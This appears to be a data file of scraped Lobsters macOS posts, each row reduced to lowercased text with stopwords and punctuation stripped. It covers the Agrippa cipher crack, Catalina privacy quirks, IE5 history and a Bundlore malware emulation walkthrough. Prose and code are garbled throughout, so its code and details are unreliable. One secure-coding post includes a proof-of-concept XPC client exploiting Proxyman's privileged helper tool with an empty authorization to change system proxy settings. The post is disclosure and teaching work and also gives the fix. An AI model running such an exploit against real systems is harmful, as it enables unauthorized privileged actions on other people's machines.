remaining silent cool incredible battery life soon bet able anymore turbo boost switcher pro relies kernel extension grandfathered apple latest security requirement never updated macos catalina load first time warns incompatible future version macos suspect last year get run latest o able turn turbo boost making future laptop usage significantly worse please apple make feature official give u low power mode macos disables turbo boost keep laptop cool quiet longlasting time important u speed
115,Lobsters,mac,Apple macOS,Cracking the Agrippa Code (1992),https://www.robertxiao.ca/hacking/agrippa/,cracking agrippa code,william gibson agrippa book dead irreversibly encrypt agrippa challenge agrippa file earlier draft version last second emulated run agrippa,cyberpunk author william gibson published poem floppy disk titled agrippa book dead poem stored macintosh program run would display poem irreversibly encrypt destroying stored poem became interested unlocking encryption agrippa agrippa challenge enlisted internet figure program figured agrippa program developed macintosh common lisp dialect lisp augmented routine interface classic macintosh o era compiled binary provided source code lost time agrippa file site dedicated collecting information resource related agrippa earlier draft version program source code encryption algorithm straightforward inhouse encryption algorithm encodes data block design clearly adhoc reflect known public cryptosystem particular reference de nothing actual de cryptosystem unmakedes function closely resembles rsa algorithm algorithm encodes data block first bit byte permuted permutation doit bit split two integer taking low bit second byte bit first byte first integer bit third byte high bit second integer second integer individually encrypted taking power mod bit reassembled byte side note appears nowhere code exponent revers action taking power mod implementation unmakedes taking number power mod power mod result original number mod integer work number divisible evidently developer never ran value using encryption system would otherwise corrupt text bit middle byte permuted different permutation dotooit three byte output encoded byte big block data whole poem encoded algorithm printed macroman character escape eg slash character output sadly combination font printing limitation mean printout enough directly decode poem several character unprintable invisible printout way reliably distinguish tab space character printed incorrectly font eg e repetitive e sequence actually e circumflex ê printout show consequently poem completely recovered printout confident analysis correct note design algorithm ensures particular aligned block character encrypt way since block character independently encrypted thus exhibit number cryptographic weakness primarily exhibited regular pattern due repeated text original plaintext sample encryption encryption three consecutive space ê quote added clarity since repeated space appear often eg chapter marker sequence seen repeated often encryption tonight red lantern battered laughing mechanism last line poem àa ò match last character data block lisp program listing next actual agrippa program ran program emulator mini vmac access suitably old hardware first major observation made application compiled version macintosh allegro common lisp dating back possibly version application contains bug allows user enter lisp repl fullyfeatured interactive environment code data program directly manipulated exploit bug press key keyboard first empty window appears bug caused missing keyboard entry handler window hitting key keyboard trigger missing handler result error upon error lisp interpreter configured start repl exploiting bug allows u examine program execution much detail previously possible first get mouse cursor enter showcursor prompt parens underscore editing becomes easier typing lispimplementationtype give macintosh allegro common lisp expected get list every variable defined type aproposlist take long time run output look like see unusual name end like shootgun mingzi aboutagri etc note lisp casesensitive symbol variable name fact variable traceoutput variable agrippa program examining lisp code agrippa file see many variable name immediately suggests variable renamed added removed process software development implying lisp listing earlier prerelease version program function unrollzi suspicious mirror name unrollthetext original lisp listing fact zi mean word chinese variable name named language english however zi variable currently available start program fresh disk image ie first time press key poem window appears typing zi repl yield complete original text poem however interested establishing whether encryption algorithm used store zi lisp program one used older lisp listing original repl turn variable cl value celllength variable original listing set cl value skip decryption routine allowing u see original encrypted data set cl larger poem used continue agrippa dutifully begin scroll mountain encrypted gibberish see telltale ê sequence screenshot actually confirm decryption algorithm used agrippa binary functionally identical one implemented lisp listing ie part program change listing final shipped version program therefore major mystery encryption algorithm used solved thing resolve scanning binary encrypted string turn absolutely nothing reason macintosh common lisp compiler compress main program code executable fish decompresses startup string searching turn anything best bet want get encrypted mass text use linux ckpt similar tool get memory dump mini vmac agrippa program loaded compression way form encryption discus depth mass encrypted text get printed end observation tell contains around unique printable symbol far short one would expect see properly encrypted piece text example original encrypted text lot unique symbol compared garbage shown end experimentation suspect text generated applying decryption algorithm plain text reduce gibberish example output later worked plaintext poem simply fed unwaymuteit uppit function linebyline characterbycharacter effectively implement simple substitution cipher character character thus modified become unrecognizable encryption trivially reversed putting text waymuteit unfortunately due limitation text display program impossible precisely determine ciphertext since character replaced box others missing entirely thus decrypting ciphertext scroll end impossible precisely however since simple substitution cipher character readable used reconstruct least part text program run second time one pretty easy program corrupts startup originally indicated lisp program listing plan write byte binary trash would inevitably render program corrupt point someone clearly thought would artistic use genetic code final version writes randomlychosen fixed c g t particular spot application file corrupts several routine program preventing starting running normally depending computer used freezing crashing whole system note genetic code codon entropy bitscodon much higher natural dna sequence known top around bitscodon blast nucleotide search turned result therefore likely randomly selected matched artificial dna sequence eg sequence shown book finally wrote code assist reverse engineering effort implement encryption decryption routine provides demonstration decryption readable part final encrypted text scroll point coding macroman pmq pq little lot celllength def makedes x reverseengineered unmakedes return pow x mod def unmakedes x return pow x pmq def doit x reverseengineered undoit return def undoit x return def dotooit x reverseengineered undotooit return x def undotooit x return def genpermute x f new temp xrange x new f temp x return new def permuteit x return genpermute x doit def waymuteit x return genpermute x dotooit def unpermuteit x return genpermute x undoit new temp xrange x new undoit temp x return new def unwaymuteit x return genpermute x undotooit new temp xrange x new undotooit temp x return new def unhappenin thisnum unmakedes little lot thatnum unmakedes little little return thisnum lot thisnum lot thatnum little little thatnum little def happenin reverseengineered unhappenin thisnum makedes little lot thatnum makedes little little return thisnum lot thisnum lot thatnum little little thatnum little def rollthetext thetext wendnone reverseengineered rollthetext encrypt piece text agrippa cipher length multiple default argument wend none wend len thetext numcells wend celllength newtext ripoff range numcells chr permuteit ord thetext ripoff chr permuteit ord thetext chr permuteit ord thetext happenin ord ord ord newtextappend chr newtextappend chr waymuteit newtextappend chr return join newtext def unrollthetext thetext wendnone decrypt piece text using agrippa cipher length multiple default argument wend none wend len thetext numcells wend celllength newtext ripoff range numcells thetext ripoff chr unwaymuteit ord thetext thetext unhappenin ord ord ord newtextappend chr unpermuteit newtextappend chr unpermuteit newtextappend chr unpermuteit return join newtext zi variable dumped vmac memory image zi decode print rollthetext decode macroman print print rollthetext rtonight red lantern battered rrlaughing rin mechanism decode macroman print poem unrollthetext zi print poemreplace r n decode macroman print encrypted text follows enclines join chr unwaymuteit ord c c line line poemsplit r delchars invisible boxchars join chr range appear box box pagestart range len enclines len enclines print line enclines pagestart dispenc line dispenc dispencdecode macroman c delchars dispenc dispencreplace c c boxchars dispenc dispencreplace c box print dispenc print page break print partial decryption ciphertext line ciphertextsplit n line line print join chr waymuteit ord c c line decode macroman program print several page ciphertext compare generated encrypted text text scrolled last second emulated run agrippa see implemented encryption routine match original note last line ciphertext page visible due limited height text display window finally script print partial decryption first page ciphertext based visible box replaced character decrypt related
116,Lobsters,mac,Apple macOS,The One Remaining Use of the Word “Macintosh”,https://tidbits.com/2020/01/10/the-one-remaining-use-of-the-word-macintosh/,one remaining use word macintosh,complex google search drive named macintosh hd apfs apfs,quick answer quickly without thinking macintosh user actually interested computer use reaction word macintosh blink probably using mac two decade whereas sound funny even entirely foreign experience mac probably shorter respond well branding change many year macintosh apple flagship product original macintosh power macintosh blue white far tell spelunking mactracker power macintosh apple final point got imac ibook power mac difficult tell precisely apple shortened macintosh powerbook powerbook somewhere around apple started referring computer generically mac week ago struck thought apple almost entirely managed scrub corporate communication word macintosh surprising course curious company slipped anywhere find put together complex google search focused apple site eliminating host thirdparty content like discussionsapplecom also eliminates page pointing technical specification old product page listing obsolete product spurious link wikipedia page hypercard somehow got applecom url search confirmed initial hunch one remaining use word macintosh today apple default macintosh hd name internal drive new mac thought published article eagleeyed reader clued three additional us drive named macintosh hd many mac user personalize name immediately although le experienced mac user often realize allowed change never done click name select second time start editing like file folder course macos catalina bifurcated system approach actually two volume macintosh hd macintosh hd data latter hold file oddly friend jeff carlson report start new mac rename internal drive finder apfs data portion drive still called macintosh hd data disk utility trouble renaming match disk utility click name type new one experienced subsequent problem curious vestigial naming everything wrong besides anachronistic use macintosh hd abbreviation hard disk hard drive refers spinning disk drive whereas mac rely ssds solidstate drive even caseless hard drive icon quick look preview window incorrectly us image spinning disk represent ssd yes buy imac tb hard drive performance poor apfs likely worse apfs catalina recommend fusion drive either straight ssd provides better performance add external drive storage necessary mac current file system apfs designed flash storage apfs apfs july apple customized icon different type drive would good start time machine drive get custom icon automatically many type storage device common past surely apple could design different icon ssds fusion drive display appropriately based type drive bonus point guess name icon far name go apple could customize name mac ssd mac fusion drive mac apart mac pro standalone ssds inside instead company usually solder flash memory chip onto motherboard appropriate name would mac drive apple could follow apfs underthehood change focus drive calling mac data paraphrase bard macintosh hd macintosh hd wherefore art thou macintosh hd dodge question rename drive something personal meaning internal drive called
117,Lobsters,mac,Apple macOS,Secure coding PrivilegedHelperTools - Part 1 - Why EvenBetterAuthorization is not enough?,https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part1/,secure coding privilegedhelpertools part evenbetterauthorization enough,apple evenbetterauthorizationsample introduction authorization service programming guide evenbetterauthorizationsample appsandboxedappdelegatem appsandboxedappdelegatem appsandboxedxpcservicexpcservicem commoncommonm authorizationrightget security apple developer documentation helpertoolhelpertoolm commoncommonm proxyman change proxy privileged action vulnerability proxyman modern delightful http debugging proxy macos noah tran nghiatran root cause evenbetterauthorizationsample exploitation master theevilbitexploits github fix similar issue luluxpclistenerm objectiveseelulu github future post resource story behind github blankwalloffensivecon talk material offensive con presentation privileged helper tool tyler bohan osx xpc revisited party application flaw youtube,first part blog post series plan privilegedhelpertools exists macos system recently took look couple tool found easy make code insecure many small piece one done wrong helper tool open abuse anyone foothold system depending application might limited certain privileged action setting system configuration mounting case broad thus full privilege escalation performed ideally real client application able talk helper tool connection refused next part come later fix example want show come later year familiar concept short overview essentially part factored application designed perform certain privileged action typically would require root access behalf application idea behind application run normal user something privileged done turn tool helper tool run different process different privilege different sandbox rule good many perspective limit possibility potential privileged escalation compared case entire application running root also make application reliable crash tool main application still run helper restarted safely communication main application happening xpc hood us mach service xpc interprocess communication macos recently became standard one know xpc stand cover xpc related stuff go example apple evenbetterauthorizationsample highly recommend reading apple authorisation concept evenbetterauthorizationsample code following part introduction authorization service programming guide evenbetterauthorizationsample cover part high level mainly sufficient privileged helper tool done going part code idea behind part show sample widely used authenticateauthorize client properly developer made error understanding code let know let see establish connection main app simply create new xpc connection appsandboxedappdelegatem void connecttohelpertoolendpoint nsxpclistenerendpoint endpoint ensures connected helper tool assert nsthread ismainthread selfhelpertoolconnection nil selfhelpertoolconnection nsxpcconnection alloc initwithlistenerendpoint endpoint selfhelpertoolconnectionremoteobjectinterface nsxpcinterface interfacewithprotocol protocol helpertoolprotocol pragma clang diagnostic push pragma clang diagnostic ignored warcretaincycles selfhelpertoolconnectioninvalidationhandler selfhelpertoolconnectioninvalidationhandler nil nsoperationqueue mainqueue addoperationwithblock selfhelpertoolconnection nil self logtext connection invalidatedn pragma clang diagnostic pop selfhelpertoolconnection resume helper tool side simple accept going forward bit function talk later many time client verification need happen bool listener nsxpclistener listener shouldacceptnewconnection nsxpcconnection newconnection assert listener selflistener assert newconnection nil newconnectionexportedinterface nsxpcinterface interfacewithprotocol protocol helpertoolprotocol newconnectionexportedobject self newconnection resume return yes pretty standard code based see client application establish xpc connection helper tool accepts everything ok authorization thing help obviously write let see appsandboxedappdelegatem first setup empty authorisation reference make external form need pas authorisation information two distinct process helper tool main app normally succeed really asked right authorizationexternalform extform err authorizationcreate null null self authref err errauthorizationsuccess err authorizationmakeexternalform self authref extform moving call setupauthorizationrights self authref self connecttoxpcservice selfxpcserviceconnection remoteobjectproxy setupauthorizationrights function found application xpc service regular xpc service mixed privilegedhelpertool appsandboxedxpcservicexpcservicem void setupauthorizationrights part xpcserviceprotocol called app startup time set authorization right authorization database common setupauthorizationrights self authref call function commoncommonm think confusing first read honestly totally misunderstood first time enumeraterightsusingblock iterate specific authorisation entry defined application normally authorisation right application want setup authorisation database shortcut show work encourage everyone read link provided beginning iterating call authorizationrightget security apple developer documentation function check entry already database note need authref database world readable authorizationrightset part important u application already installed entry database void setupauthorizationrights authorizationref authref see comment header assert authref null common enumeraterightsusingblock nsstring authrightname id authrightdefault nsstring authrightdesc osstatus blockerr first get right get back errauthorizationdenied mean current definition add default one blockerr authorizationrightget authrightname null blockerr errauthorizationdenied blockerr authorizationrightset authref authref authrightname rightname bridge cftyperef authrightdefault rightdefinition bridge cfstringref authrightdesc descriptionkey null bundle null implies main bundle cfstr common localetablename assert blockerr errauthorizationsuccess else right already exists err noerr error occurs assume set advance system administrator second time run either way nothing u done authorisation reference external form ready note happened setting empty authorisation without right anyone let see happens call one function helper tool let take writelicensekey example helpertoolhelpertoolm call checkauthorization void writelicensekey nsstring licensekey authorization nsdata authdata withreply void nserror error reply part helpertoolprotocol save license key default database nserror error error nil self isvalidlicensekey licensekey error nserror errorwithdomain nsosstatuserrordomain code paramerr userinfo nil error nil error self checkauthorization authdata command cmd error nil nsuserdefaults standarduserdefaults setobject licensekey forkey klicensekeydefaultskey reply error checkauthoriation first verify authorizationexternalform valid check right create authorizationrefernce setup empty authorisation right set copy required right name authorizationrightforcommand important part happens authorizationcopyrights point actual authorisation happens important see helpertool authorized actual client flag set needed helper tool interact user ask password nserror checkauthorization nsdata authdata command sel command check client denoted authdata allowed run specified command authdata expected nsdata authorizationexternalform embedded inside pragma unused authdata nserror error osstatus err osstatus junk authorizationref authref assert command nil authref null first check authdata look reasonable error nil authdata nil authdata length sizeof authorizationexternalform error nserror errorwithdomain nsosstatuserrordomain code paramerr userinfo nil create authorization ref external form data contained within error nil err authorizationcreatefromexternalform authdata byte authref authorize right associated command err errauthorizationsuccess authorizationitem oneright null null authorizationrights right oneright onerightname common authorizationrightforcommand command assert onerightname null err authorizationcopyrights authref right null kauthorizationflagextendrights kauthorizationflaginteractionallowed null err errauthorizationsuccess error nserror errorwithdomain nsosstatuserrordomain code err userinfo nil authref null junk authorizationfree authref assert junk errauthorizationsuccess return error let go back authorisation right entered authorisation database define user authenticate found commoncommonm important part kcommandkeyauthrightdefault set kauthorizationruleclassallow mean authorization granted criterion met set kauthorizationruleauthenticateasadmin popup displayed user however come helper tool asking authorisation actual client user likely happily authenticate scommandinfo nsstringfromselector selector readlicensekeyauthorization withreply kcommandkeyauthrightname comexampleapplesamplecodeebasreadlicensekey kcommandkeyauthrightdefault kauthorizationruleclassallow kcommandkeyauthrightdesc nslocalizedstring ebas trying read license key prompt shown user required authorize read license key nsstringfromselector selector writelicensekey authorization withreply kcommandkeyauthrightname comexampleapplesamplecodeebaswritelicensekey kcommandkeyauthrightdefault kauthorizationruleauthenticateasadmin kcommandkeyauthrightdesc nslocalizedstring ebas trying write license key prompt shown user required authorize write license key nsstringfromselector selector bindtolownumberportauthorization withreply kcommandkeyauthrightname comexampleapplesamplecodeebasstartwebservice kcommandkeyauthrightdefault kauthorizationruleclassallow kcommandkeyauthrightdesc nslocalizedstring ebas trying start web service prompt shown user required authorize start web service summarise model sufficient client connect helper tool client setup empty authorisation reference passed tool authorisation rule specifies kauthorizationruleclassallow mean authorisation granted without popups even popup helper tool misleading detailed analysis evenbetterauthorizationsample let see real world example proxyman change proxy privileged action vulnerability proxyman web debugging proxy tool macos upon installation first run installs privileged helper tool later used change proxy setting application changing proxy setting privileged action default requires user authentication use helper tool application always change proxy without constant user authentication normally helper tool work main application however due incorrect coding user interact change proxy software url proxyman modern delightful http debugging proxy macos kudos developer noah tran nghiatran fixed issue couple day root cause application us apple old developer guide evenbetterauthorizationsample saw using example mean someone connected either get authorisation without prompt authright set kauthorizationruleclassallow case time including app even set prompting still talk tool least need get user consent clear proxyman used apple sample code implementation see example comparing apple source nserror checkauthorization nsdata authdata command sel command check client denoted authdata allowed run specified command authdata expected nsdata authorizationexternalform embedded inside pragma unused authdata nserror error osstatus err osstatus junk authorizationref authref assert command nil authref null first check authdata look reasonable error nil authdata nil authdata length sizeof authorizationexternalform error nserror errorwithdomain nsosstatuserrordomain code paramerr userinfo nil create authorization ref external form data contained within error nil err authorizationcreatefromexternalform authdata byte authref authorize right associated command err errauthorizationsuccess authorizationitem oneright null null authorizationrights right oneright onerightname common authorizationrightforcommand command assert onerightname null err authorizationcopyrights authref right null kauthorizationflagextendrights kauthorizationflaginteractionallowed null err errauthorizationsuccess error nserror errorwithdomain nsosstatuserrordomain code err userinfo nil authref null junk authorizationfree authref assert junk errauthorizationsuccess return error decompiled code helpertool exploitation rather easy case easily implement client based apple original source code replace relevant constant call helper tool via interface first define thehelpertoolprotocol easily get classdump running helper tool protocol helpertoolprotocol void setproxysystempreferenceswithauthorization nsdata enabled bool host nsstring port nsstring reply void nserror bool void getversionwithreply void nsstring void connectwithendpointreply void nsxpclistenerendpoint end use apple source setup empty authorisation saw earlier err authorizationcreate null kauthorizationemptyenvironment kauthorizationflagdefaults authref const char str cfstringgetcstringptr seccopyerrormessagestring err nil kcfstringencodingmacroman printf osstatus sn str err errauthorizationsuccess err authorizationmakeexternalform authref extform str cfstringgetcstringptr seccopyerrormessagestring err nil kcfstringencodingmacroman printf osstatus sn str err errauthorizationsuccess authorization nsdata alloc initwithbytes extform length sizeof extform str cfstringgetcstringptr seccopyerrormessagestring err nil kcfstringencodingmacroman printf osstatus sn str assert err errauthorizationsuccess lastly connect xpc service nsstring servicename xpchelpermachservicename nsxpcconnection agentconnection nsxpcconnection alloc initwithmachservicename servicename agentconnection setremoteobjectinterface nsxpcinterface interfacewithprotocol protocol helpertoolprotocol agentconnection resume id obj agentconnection remoteobjectproxywitherrorhandler nserror error void error nslog connection failure nslog obj obj nslog conn agentconnection obj setproxysystempreferenceswithauthorization authorization enabled enab host myproxy port myport reply nserror err bool b nslog response err obj setproxysystempreferenceswithauthorization authorization enabled enab host myproxy port myport reply nserror err bool b nslog response err nslog done full poc downloaded master theevilbitexploits github fix similar issue repeat every bog post write topic spoiling also coming one think important client process verification shouldacceptnewconnection call verify following connecting process signed apple connecting process signed team id connecting process identified bundle id connecting process minimum software version fix implemented somehow like luluxpclistenerm objectiveseelulu github beyond client allowed connect run hardened runtime without allowing following comapplesecuritycsallowdyldenvironmentvariables comapplesecuritycsdisablelibraryvalidation comapplesecuritygettaskallow entitlement would allow another process inject code app thus allowing talk helper tool future post part talk client part run hardened runtime entitlement big likely come april example want cover fixed part talk minimum client version important date unknown yet eta bug fix want cover resource story behind github blankwalloffensivecon talk material offensive con presentation privileged helper tool tyler bohan osx xpc revisited party application flaw youtube
118,Lobsters,mac,Apple macOS,Internet Explorer 5 for Mac: twentieth anniversary,http://jimmy.grew.al/macie5-twentieth-anniversary/,internet explorer mac twentieth anniversary,internet explorer macintosh edition embrace standard compliant web content browser war microsoft antitrust trial tantek çelik documented blog new look set look mac ie possibly kickstarted aqua sorry invented translucent blurred window maf vosburgh,today jan mark twentieth anniversary introduction microsoft internet explorer macintosh edition macie important release internet explorer mac last also first large thirdparty mac application ship mac o x first mainstream web browser embrace standard compliant web content anniversary also significant macie first product worked started working microsoft summer year old thrown deep end browser war microsoft antitrust trial lovehate relationship microsoft apple want delve detail made macie special friend tantek çelik already documented blog rather want focus inside story developed people personality shaped success eventual demise posted twitter thread go detail bout event leading unveiling macie steve job also want share detailed history macie bold ui design dubbed new look internally history compiled maf vosburgh developer conceived executed implementation major ui redesign new look set look mac ie possibly kickstarted aqua sorry invented translucent blurred window maf vosburgh january california summer moved london san jose california write code mac ie microsoft supposed go work apple cupertino apple recruiter screwed offer paperwork microsoft snapped explain background bbc spinoff called mmc coding mac multimedia software cdroms like atlas douglas adam last chance see used working graphic designer rough prototype would beautiful image really ought look bit back forth lovely product mmc started using tool like hypercard supplemented custom plugins switched native code never looked back coming artistinfluenced multimedia world visual style microsoft progress mac ie looked ancient everything macos platinum style shade gray like cement horde tiny pixel toolbar icon color bit mask obviously designed engineer pixel editor like resedit meanwhile mac hardware era incredibly vivid first bondi blue imac whole palette imacs translucent candy color white pinstriped element poster office wall eventually whole mac range vivid design style gray drab interface macos matched seemed left behind apple demo time future o would came mac o x also used gray look building stateoftheart new html engine ie tasman wanted chrome modern idea making browser chrome match actual hardware mac bezel bondi blue make ui bondi blue way frame around web page would match bezel would seen part background distinct content vivid would paradoxically blend background look home put idea rest mac ie team loved graphic artist little office san jose suggested hire company called nykris back london nykris digital design company founded two artist previously worked mmc nikki barton chris prior first name combined make company name great people staff trusted like graham bartram somehow mac exec dick craddock let newly hired engineer hire london design agency ended artdirecting side also writing new ui code make happen nykris came range fascinating design sketch sketch followed original idea coordinating flavor new apple hardware look worked best followed path gradually spring design emerged started look like mac ie turned shiny simple button shape pinstripe pixel repeat made pattern fine enough hurt readability although inconvenient code mac ie lead steve falkenberg worked make system scroll bar match whatever color scheme using also worked autodetect flavor mac program manager jimmy grewal worked elegant ui customizing toolbar layout much imitated since nykris totally redesigned tab strip looked also came idea toolbar able collapse tab strip left hand side gained back lot vertical screen estate valuable small screen day nykris sent artwork london working implement design san jose without slowing ie using much memory new look secret daily mac ie build qa external beta tester using everything switchable newlook build macro leave trace regular beta build continued look like mac ie changing lot ui code keeping build working tricky big bit icon bit mask switchable flavor work memory old toolbar system new tab code custom everything drawn antialiased line text rapidly came together summer demoed secret new look build mac steve job first person see outside nykris people mac ie team steve gave enthusiastic approval yeah eventually macworld january came along venue unveiling mac ie beta steve job insisted mac ie demo tnis thing got little surprising steve first showed new build mac o x new user interface called aqua looked well like nykris design using half year point demoed ie showing experimental carbon port mac o x said ui look inherited operating system mac ie looked mac o time oh well steve steve steve see summer new look demo tell team create aqua know stuff case inspired apple hardware design feel bad side note blurred translucent window mac ie launched march blurred translucent autocomplete window first time blurred translucent window thing ever done look everywhere right people might want know came summer one last big idea big white autocomplete window came address bar typed bothering covered lot web page page star web browser felt like window hiding context wrote version window made window translucent trivial macos readability overlayed text bad tried changing tone background image make better background improvement still idea also blurring background content eye used interpreting sharp foreground object blurred stuff background like reading letter shop window effect people used seeing premade photoshop artwork something anyone used realtime live effect time gaussian blur something photoshop required lot memory quickly mac kind hardware acceleration modern machine fact actual gpu knew write gaussian blur routine took noticeable time used little memory even large image worked depth content back people ran mac kind color depth bit still common actual magic came involved bunch secret programming trick math shortcut eventually virtually instant blur routine could process pixel depth image tonally adjust image time go picture come picture put black text top easily read could tell right value dialed could recognize web page background felt gone anywhere could read style pt aliased black type layered top virtually added difficulty blur filtered highfrequency information background tonal shift gave contrast needed read text mac ie release march included blurred translucent autocomplete window despite management indecision look time revolutionary later year added effect conxtextual menu ui stuff come year significant retrospect key design element window vista io mac although almost never get recipe right need blur toning either lightening black text overlay darkening white text much either lose context unfortunately carbon port mac ie mac o x never got blurred translucent window code skeleton crew finished carbon port instead used mac o x builtin translucency without blur thing want extend special thanks friend tantek maf dick kevin bertrand refreshing memory event twenty year ago look forward sharing anecdote development macie relationship microsoft apple year
120,Lobsters,mac,Apple macOS,Native Applications with Racket,https://defn.io/2020/01/04/remember-internals/,native application racket,remember use racketgui proof concept ddhotkey swift work racket core server run core notarization would io lobster,couple day ago released native macos application called remember small keyboarddriven application stashing away notesreminders later one cool thing programming nerd perspective completely native cocoa application whose frontend built swift core business logic racket use racketgui started proof concept used racket gui realized write bunch objectivec ffi code get ui look way wanted carbon copy spotlight seemed like would pain try integrate ddhotkey add support launching login package easy distribute also unsure could notarize distribution macos catalina later swift know swift particularly well like much find apple documentation lackluster xcode surprisingly buggy renaming class associated file fails rename file disk cause xcode fail silently example mind documentation bad core cocoa code open sourcesource available least could look implementation try understand going importantly plan support window linux mean writing core portable language going minimize amount work well difference implementation platform work racket core run custom jsonrpc server listens command stdin sends response stdout using racket raco exe raco distribute command core get built native executable copied swift app resource folder swift application run core subprocess startup communicates via pipe rpc command asynchronously handled core core may also send asynchronous notification frontend let know entry due notarization took couple hour figure get everything notarized enable app sandboxing frontend core application figure via trial error entitlement necessary realize needed separate set entitlement core application comapplesecurityinherit entitlement whatever reason let subprocess inherit parent entitlement meaning also explicitly assign core application allow jit allow unsigned executable memory entitlement else process would get killed sigint red herring error message executable valid bundle identifier would see porting platform go far happy approach result fast built rpc infrastructure easily copy code project writing business logic racket mean iterate quickly writing gui code using native tool platform advantageous term look feel distribution io unfortunately rpc approach break io allowed run subprocesses approach could work building app shared library linking rpc inprocess think approach could work racket would able target feasible fortunately racket able run top chez scheme already backends many platform including might possibility future myfreeweb pointed lobster already supported
121,Lobsters,mac,Apple macOS,Remember: Stash distractions for later,https://github.com/bogdanp/remember,remember stash distraction later,remember buying copy build requirement firsttime setup building license,remember remember tool stashing distraction away later bind hotkey default whenever something unexpected pop say suddenly realize need stock milk hit hotkey type buy milk hit return hour later get reminded need go buy milk find remember useful please consider buying copy application open source providing source code want user able see code running even change build want vein free read build run application device please nt share built artifact others build requirement firsttime setup raco pkg install name remember core cd cocoaremember carthage update building make cd cocoaremember xcodebuild license copyright cleartype srl right reserved
124,Lobsters,mac,Apple macOS,Multipass 1.0 - A mini-cloud on your Mac or Windows workstation,https://multipass.run/,multipass minicloud mac window workstation,pet cattle,pet cattle primary instance get special treatment integration native filesystem dedicated hotkey access
125,Lobsters,mac,Apple macOS,Undocumented Catalina file access change,https://lapcatsoftware.com/articles/macl.html,undocumented catalina file access change,undocumented catalina file access change december jeff johnson support blog please buy apps stopthemadness underpass blog post developer forum,undocumented catalina file access change december jeff johnson support blog please buy apps stopthemadness underpass well known drag file finder drop terminal full path file output terminal behavior occurs copy paste always convenient innocuous macos catalina discovered catalina pasting file finder output file path terminal also invisibly permanently grant terminal access file bypassing macos privacy protection file access privacy protection introduced macos mojave expanded catalina mojave restricted access directory libraryapplication supportaddressbook librarysafari catalina added even restricted directory downloads document discussed macos privacy protection shortcoming several time blog grant special exception builtin file access policy clicking one much beloved permission dialog pop mojave catalina manually configuring exception security privacy pane system preference quite explicit user discovered though catalina also implicitly even accidentally grant special exception builtin policy also explicitly chosen special exception illustrate example going focus terminal application located haha kidding moved catalina systemapplicationsutilitiesterminalapp fresh install catalina terminal special permission see system preference try list content document folder terminal get permission dialog millennials killing unix press nt allow see l document operation permitted terminal decision also displayed system preference document folder unchecked terminal copy document folder finder paste terminal suddenly work notice copying finder document folder new comapplemacl extended attribute assume l macl stand lockdown someone tell otherwise special extended attribute give terminal possibly apps special access file comapplemacl extended attribute well special file access persistent across reboots indeed remains even reset privacy permission terminal comapplemacl extended attribute persistent ca nt even delete seriously sudo sudo nt turn comapplemacl extended attribute governed system integrity protection way delete disable sip boot another volume delete thus implicitly grant special access file ca nt easily revoke special access far tell documentation important privacy protection change catalina reference comapplemacl found apple web site reply post developer forum longtime apple developer technical support engineer quinn reply suggestive sparse detail post nt even finder terminal rather open panel nonsandboxed apps discovered last night still fully clear implementation implication comapplemacl feature welcome investigation people besides lack documentation seem several problematic aspect inability delete extended attribute fact implicit access directly contradict explicit access shown system preference keep mind used document example implicit special access granted file folder even lead bizarre situation terminal access file access folder containing file situation inspiration discovery
126,Lobsters,mac,Apple macOS,Catalina 10.15.2 has changed Gatekeeper’s dialogs to confuse notarization status,https://eclecticlight.co/2019/12/15/catalina-10-15-2-has-changed-gatekeepers-dialogs-to-confuse-notarization-status/,catalina changed gatekeeper dialog confuse notarization status,apple support note postscript like,updated macos catalina installed notarized apps since might noticed something gone missing remember dialog shown gatekeeper first open notarized app telling apple checked malicious software none detected well sentence vanished instead dialog look similar precatalina dialog nonnotarized apps significant difference gatekeeper icon defaced yellow warning triangle go check dialog apple support note explaining gatekeeper work catalina earlier see new dialog appear exist catalina could forgiven assuming system subverted malware app trying open notarized indeed apple word indicate without statement apple check malicious software dialog could malicious app notarized apple indicates apple checked malicious software none detected many user interpret meaning specific word gatekeeper recognition app trying open notarized without word surely app notarized gatekeeper dialog appear changed though trying open nonnotarized app quarantine flag set still show normal refusal trying bypass using finder open command still show extended threebutton variant full mark apple making unannounced undocumented change observant user almost certainly misinterpret badly course result thirdparty product trying open contact apple support app good mind bill apple support providing cover fact apple make arbitrary change whim without informing developer user leaf u wondering hell going postscript checking gatekeeper first run dialog changed shown although appear image initial release catalina mojave fully patched catalina show apple already removed statement checking malicious software sake comparison maybe apple want distance reliability check malware going change critical dialog capriciously least could keep documentation date user know supposed see perhaps biggest lesson hardly anyone read important security dialog like perhaps bombarded many security privacy dialog perhaps become commonplace worthless grateful first drew attention change concerned notarized apps notarized like like loading related
127,Lobsters,mac,Apple macOS,New macOS Bundlore Loader analysis,https://blog.confiant.com/new-macos-bundlore-loader-analysis-ca16d19c058c,new macos bundlore loader analysis,artem bryzgalov unsplash analyzing osxbundlore loader using emulation emulator v debugger multi platform multiarchitecture infect unicorn engine enter unicorn engine memmap hookadd hookcode uchookcode hookcode jmp call call call rip write rsi rsi tmpdumped muregread rsi mumemread bundloreemulation hookcode loadbinary bundloreemulation bundloreemulation bundloreemulation bundloredump bundloreemulation hookcode loadbinary bundloredump bundloredump tmpdumpedpy,photo artem bryzgalov unsplashanalyzing osxbundlore loader using emulationemulator v debuggerin previous section blog post explained use lldb python api dump hidden python payload faced couple limitation overcame developing custom lldb commandsthe downside using debugger debugger self executing malware code instruction real cpu testing virtual machinewhile might security risk measure need run analysis tool unattended scale running debugger large number binary unimaginable want tool minimizes risk infectionwe want multiplatform multiarchitecture cpu emulator allow u analyze malware binary platform infectfor example analyzing window malware linux server macos malware window server etc performed powerful emulator unicorn engineenter unicorn engineunicorn engine need introduction one complete tool emulation exists information install use found hereluckily u tool provides python binding use exercisewe write proof concept emulate one function setup stackstrings order extract fileunicorn engine imported module python via following start initializing unicorn engine specifying architecture detail tell uc base address binary map heap space stack space emulated program use execution size binary want emulate create stay aligned stack estimate half binary filled stackstrings allocate use memmap purpose write binary memory space allocated also point rsp register end stack stack grows downward arch abi simply start emulator passing start stop address proof concept two address basically first last address function start function function voila unicorn engine readyif start emulation nothing special apart emulating instruction exit tell unicorn engine want accomplish unicorn engine read mind yet important function unicorn engine hookadd function call callback function define hookcode every time instruction emulated passing uchookcode first argument function good place write custom hook let define callback function hookcode take care special case usually encounter emulating specific part code binary generalthe cpu emulator naively emulate instruction find including sort code branch function call etc fact jmp call instruction followed call instruction ultimately fail since might calling external function library etc sake simplicity skip instruction exception one interested skip unwanted instruction particularly call instruction opcode point rip register next instruction following current emulated instructionand add exception write call located function interested inas know write important function exercise write 